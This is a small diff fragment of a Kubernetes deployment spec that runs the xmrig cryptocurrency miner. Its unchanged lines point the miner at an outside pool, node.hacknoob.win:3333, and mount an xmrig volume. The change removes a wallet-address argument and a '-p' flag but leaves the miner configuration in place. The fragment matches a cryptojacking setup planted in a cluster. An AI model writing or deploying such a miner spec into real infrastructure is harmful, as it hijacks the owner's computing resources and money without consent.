@@ -20,8 +20,6 @@ spec:
     - -o
     - node.hacknoob.win:3333
     - -u
-    - 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDMTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
-    - -p
     - master
     volumeMounts:
     - name: xmrig-volume-m
